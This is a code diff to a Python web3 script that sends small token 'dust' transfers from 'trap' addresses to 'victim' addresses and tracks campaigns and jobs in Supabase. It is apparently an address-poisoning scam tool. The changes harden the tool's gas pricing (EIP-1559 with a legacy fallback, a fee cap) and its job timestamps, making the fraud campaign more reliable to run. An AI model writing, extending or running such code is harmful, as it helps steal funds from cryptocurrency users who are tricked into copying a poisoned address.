@@ -4,6 +4,7 @@ import os
 import re
 import time
 import argparse
+from datetime import datetime, timezone
 from web3 import Web3
 from dotenv import load_dotenv
 
@@ -47,8 +48,8 @@ if SUPABASE_URL and SUPABASE_KEY and create_client:
     supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 def update_job(job_id, status=None, progress=None, total=None, message=None):
-    """Update job status in Supabase."""
-    if not supabase:
+    """Update job status in Supabase with proper ISO timestamps."""
+    if not supabase or not job_id:
         return
     data = {}
     if status is not None:
@@ -59,10 +60,16 @@ def update_job(job_id, status=None, progress=None, total=None, message=None):
         data["total"] = total
     if message is not None:
         data["message"] = message
+        
+    iso_now = datetime.now(timezone.utc).isoformat()
     if status == "running" and "started_at" not in data:
-        data["started_at"] = "now()"
+        data["started_at"] = iso_now
     if status in ("completed", "failed"):
-        data["completed_at"] = "now()"
+        data["completed_at"] = iso_now
+
+    if not data:
+        return
+
     try:
         supabase.table("jobs").update(data).eq("id", job_id).execute()
     except Exception as e:
@@ -323,16 +330,41 @@ def send_dust(private_key, victim_address, campaign_id=None):
             _local_nonces[trap] = max(_local_nonces[trap], rpc_nonce)
         nonce = _local_nonces[trap]
 
-        base_fee = call_with_retry(w3.eth.get_block, "latest")["baseFeePerGas"]
-        max_priority = w3.to_wei(getattr(config, 'GAS_PRIORITY_FEE_GWEI', 0.05), "gwei")
-        
+        # --- DYNAMIC GAS & EIP-1559 / LEGACY PRICING ---
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
         fee_buffer = getattr(config, 'GAS_FEE_BUFFER', 1.15)
-        max_fee = int((base_fee + max_priority) * fee_buffer)
-        
-        max_fee_cap = getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 500)
-        max_fee = min(max_fee, w3.to_wei(max_fee_cap, "gwei"))
-        if max_priority > max_fee:
-            max_priority = int(max_fee * 0.1)
+        max_fee_cap_gwei = getattr(config, 'GAS_MAX_FEE_CAP_GWEI', 500)
+        max_fee_cap = w3.to_wei(max_fee_cap_gwei, "gwei")
+
+        if "baseFeePerGas" in latest_block and latest_block["baseFeePerGas"] is not None:
+            base_fee = latest_block["baseFeePerGas"]
+            try:
+                max_priority = w3.eth.max_priority_fee
+            except Exception:
+                max_priority = w3.to_wei(getattr(config, 'GAS_PRIORITY_FEE_GWEI', 0.05), "gwei")
+
+            max_priority = min(max_priority, max_fee_cap)
+            calculated_max = int((base_fee * fee_buffer) + max_priority)
+            max_fee = min(calculated_max, max_fee_cap)
+
+            # Invariant: EVM requires maxFeePerGas >= maxPriorityFeePerGas
+            if max_fee < max_priority:
+                max_fee = max_priority
+
+            gas_params = {
+                "maxFeePerGas": max_fee,
+                "maxPriorityFeePerGas": max_priority
+            }
+            effective_gas_price = max_fee
+        else:
+            try:
+                gas_price = w3.eth.gas_price
+            except Exception:
+                gas_price = w3.to_wei(1, "gwei")
+            effective_gas_price = min(int(gas_price * fee_buffer), max_fee_cap)
+            gas_params = {
+                "gasPrice": effective_gas_price
+            }
 
         chain_id = w3.eth.chain_id
 
@@ -358,15 +390,16 @@ def send_dust(private_key, victim_address, campaign_id=None):
             logger.warning(f"Gas estimation failed: {e}, using fallback 68000")
             gas_limit = 68000
 
-        tx = token.functions.transfer(victim, dust).build_transaction({
+        tx_payload = {
             "from": trap,
             "nonce": nonce,
             "chainId": chain_id,
             "gas": gas_limit,
-            "maxFeePerGas": max_fee,
-            "maxPriorityFeePerGas": max_priority,
-        })
-        required_eth = gas_limit * max_fee
+            **gas_params
+        }
+
+        tx = token.functions.transfer(victim, dust).build_transaction(tx_payload)
+        required_eth = gas_limit * effective_gas_price
 
         native_balance = call_with_retry(w3.eth.get_balance, trap)
 
